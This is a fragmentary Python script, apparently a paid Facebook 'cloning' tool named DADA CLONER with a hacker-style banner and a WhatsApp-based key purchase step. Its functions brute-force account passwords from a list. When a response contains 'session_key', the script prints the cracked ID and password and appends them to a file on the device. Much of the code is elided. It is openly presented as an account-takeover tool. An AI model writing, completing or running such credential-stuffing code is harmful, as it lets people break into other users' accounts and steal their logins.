...
----------------------------------------------
 HACKING IS LIFE?
 WhatsApp  : NUMBER NAHI LEKONGA PIR LARKIYA TANG KARTE HAI😜
 Facebook  : DADA SARKAR
 Tool Name : DADA CLONING
 Type type : PAID
 Version   : 0.1
----------------------------------------------
 DADA CLONER version 0.1
 FRIENDS🔥   DADAX😈  MUSA😈
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923038289017&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi sarkar Sir, I Need To Buy Your Paid DADAX PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python DADAX.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [DADAX-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [DADAX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [DADAX-OK] '+uid+' | '+pas+'\033[1;97m')
